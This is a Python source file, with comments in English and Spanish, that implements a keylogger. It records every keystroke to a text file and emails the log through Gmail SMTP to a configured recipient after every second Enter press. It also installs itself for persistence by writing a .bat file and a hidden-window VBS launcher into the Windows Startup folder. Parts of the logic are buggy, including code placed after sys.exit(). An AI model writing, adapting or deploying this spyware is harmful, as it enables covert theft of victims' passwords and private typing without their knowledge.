import os.path
from pynput import keyboard
import smtplib, ssl
from email.message import EmailMessage
from os import remove
import sys
import getpass


path_txt_teclado = 'key_logger.txt'             #Here we define the path where is going to be the txt file with all de keys that are pressed.

sender = ''
reciver = ''            #You must fill this variable with the sender email, reciver email and the email password.
password = ''

count = 0

def open_txt():
    global f
    f = open(path_txt_teclado , 'w')        #Creation of the txt that I mentioned before.
    f.close()
    f = open(path_txt_teclado , 'r')

#Esta funcion nos dice las teclas que hemos presionado

def on_press(key):

    global count , sender , reciver , password , path_txt_teclado

    try:
        print(' The key {} was pressed '.format(key.char))
        f = open(path_txt_teclado, 'a')
        f.write(key.char)                                       #With this try we identify if the key is a letter and we write it on the .txt file.
        f.write('\n')
    except:
        print(' La tecla {} fue presionada '.format(key))
        f = open(path_txt_teclado,'a')
        if key == 'Key.backspace':
            f.write('%BORRAR%')                                 #The same but it runs if the key pressed is a special key like a backspace.
            f.write('\n')
        elif key == 'Key.space':
            f.write(' ')
            f.write('\n')

        if key == key.enter:
            count += 1
            if count % 2 == 0:                  # Each 2 times the Enter key is pressed, the function that sends the email will be called.
                send_email(sender , reciver , password)


#Funcion que registra las pulsaciones de teclado

def read_pressed_keys():

    with keyboard.Listener(on_press = on_press) as listener:    #Here we defined the function that read de pressed keys.
        listener.join()



def read_file(f):
    texto = f.readlines()
    texto = ''.join(texto)          #This function reads the file and returns the content.
    return texto


def send_email(sender,reciver, password):
    global path_txt_teclado , f
    texto = read_file(f)
    message = texto
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()                           #This function use is to log in a gmail server with the data of the lines(12-14) and sends the content we returned in 'read file' function.
    server.login(sender , password)
    server.sendmail(sender , reciver , message)
    f.close()
    move_file()
    sys.exit()
    on_press(read_pressed_keys())
    server.quit()


#Function that makes a .bat file that will be run by a vbs file which is save in a path that runs all the files it contains.

def move_file():
    user_name = getpass.getuser()
    final_path = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(user_name)
    path_script = os.path.dirname(os.path.abspath(__file__))

    with open('open.bat', 'w+') as bat_file:
        bat_file.write('cd "{}"\n'.format(path_script))
        bat_file.write('python "keylogger.py"')

    with open(final_path+'\\'+"open.vbs", "w+") as vbs_file:
        vbs_file.write('Dim WinScriptHost\n')
        vbs_file.write('Set WinScriptHost = CreateObject("WScript.Shell")\n')
        vbs_file.write('WinScriptHost.Run Chr(34) & "{}\open.bat" & Chr(34), 0\n'.format(path_script))
        vbs_file.write('Set WinScripthost = Nothing\n')


#Finally we call all the needed functions.

if __name__ == '__main__':
    open_txt()
    move_file()
    read_pressed_keys()
    remove(path_txt_teclado)
    
    while count < 10:
        print(count)
        open_txt()                      # It will be runing until the Enter key is pressed 9 times.
        read_pressed_keys()
        remove(path_txt_teclado)
